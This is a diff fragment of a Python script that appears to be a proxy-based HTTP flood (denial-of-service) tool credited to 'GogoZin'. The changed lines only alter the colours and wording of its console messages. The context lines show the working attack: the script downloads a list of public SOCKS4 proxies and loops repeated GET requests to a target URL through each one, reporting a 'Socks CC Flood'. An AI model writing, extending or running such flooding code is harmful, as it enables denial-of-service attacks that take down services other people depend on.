@@ -178,7 +178,7 @@ def main():
 		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=2000&country=all') #Code By GogoZin
 		with open('socks4.txt','wb') as fp:
 			fp.write(rsp.content)
-			print(Fore.YELLOW + "[+] Sucess Get Fresh Socks4 List !")
+			print(Fore.GREEN + "[+] Sucess Get Fresh Socks4 List !")
 	else:
 		pass
 	list = str(input(Fore.BLUE + "[+] Socks List (socks4.txt): " + Fore.WHITE))
@@ -211,7 +211,7 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print("[+] Socks4 Attack Successful [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
+						print(Fore.BLUE + "[+] Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
 					s.close
 				except:
 					s.close()
